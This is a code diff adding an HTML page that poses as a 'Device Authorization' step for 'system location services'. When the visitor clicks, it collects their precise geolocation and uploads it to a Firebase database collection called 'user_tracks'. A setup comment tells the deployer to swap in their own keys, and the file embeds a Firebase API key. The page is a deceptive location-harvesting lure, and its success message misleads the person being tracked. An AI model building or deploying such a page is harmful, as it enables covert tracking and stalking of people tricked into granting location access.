@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Authorization</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #f5f5f7;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .card {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            text-align: center;
+            max-width: 350px;
+            width: 100%;
+        }
+        button {
+            background-color: #0071e3;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            font-size: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: 600;
+        }
+        button:hover { background-color: #0077ed; }
+        #status { margin-top: 15px; color: #6e6e73; font-size: 14px; line-height: 1.4; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>Device Authorization</h2>
+    <p>Click the button below to authorize system location services.</p>
+    <button id="actionBtn">Authorize & Connect</button>
+    <div id="status">Awaiting authorization...</div>
+</div>
+
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+    // 👇 STEP 3: REPLACE THIS WHOLE BLOCK WITH YOUR KEYS FROM THE SCREENSHOT
+    const firebaseConfig = {
+        apiKey: "AIzaSyCWBZTfpBfsZSvwyMEXXFVLCNHmiLVRzGo",
+  authDomain: "location-data-9162e.firebaseapp.com",
+  projectId: "location-data-9162e",
+  storageBucket: "location-data-9162e.firebasestorage.app",
+  messagingSenderId: "287100503490",
+  appId: "1:287100503490:web:4df27eab48863bdebf825b",
+  measurementId: "G-JKND2MFP0X"
+    };
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    const actionBtn = document.getElementById('actionBtn');
+    const statusDiv = document.getElementById('status');
+
+    actionBtn.addEventListener('click', () => {
+        if (!navigator.geolocation) {
+            statusDiv.textContent = "Error: Geolocation is not supported by this browser.";
+            return;
+        }
+
+        statusDiv.textContent = "Requesting permission...";
+
+        navigator.geolocation.getCurrentPosition(
+            async (position) => {
+                statusDiv.textContent = "Permission granted! Syncing to cloud...";
+
+                const identityData = {
+                    lat: position.coords.latitude,
+                    lon: position.coords.longitude,
+                    accuracyInMeters: position.coords.accuracy,
+                    syncedAt: serverTimestamp()
+                };
+
+                try {
+                    // This sends data straight to your Firebase database
+                    await addDoc(collection(db, "user_tracks"), identityData);
+                    statusDiv.innerHTML = "✅ Synchronization Complete!<br>Device data registered successfully.";
+                } catch (dbError) {
+                    statusDiv.textContent = "Database Error: " + dbError.message;
+                }
+            },
+            (geoError) => {
+                statusDiv.textContent = "Error: Access denied or timed out.";
+            },
+            { enableHighAccuracy: true, timeout: 15000 }
+        );
+    });
+</script>
+
+</body>
+</html>
